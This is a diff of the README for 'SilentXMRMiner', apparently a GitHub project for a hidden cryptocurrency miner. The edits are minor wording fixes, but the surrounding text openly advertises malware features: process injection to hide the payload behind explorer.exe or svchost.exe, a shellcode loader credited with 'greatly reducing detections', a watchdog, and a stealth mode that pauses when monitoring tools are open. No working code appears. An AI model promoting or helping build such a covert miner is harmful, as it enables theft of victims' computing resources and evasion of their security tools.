@@ -45,7 +45,7 @@ Can mine all the following algorithms and thus all the cryptocurrencies that use
 
 * Native & .NET - Miner installer and watchdog coded in C#, Shellcode loader/injector coded in C, miner requires .NET Framework 4.5
 * Shellcode - All .NET C# parts are converted into Shellcode and injected using a native C loader, can be disabled
-* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or other process
+* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or other processes
 * CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
 * Idle Mining - Can be configured to mine at different usages or not at all while computer is or isn't in use
 * Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
@@ -69,7 +69,7 @@ You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/w
 ## Changelog
 
 ### v1.5.0 (02/10/2021)
-* **The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
+**The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
 * Added new Shellcode loader, the miner, watchdog and uninstaller will now be converted into shellcode and injected using a native C loader which greatly reduces detections
 * Added custom tcc C compiler to compile the Shellcode loader
 * Added custom windres resource compiler to allow icons, assembly data and run as administrator for the native C program
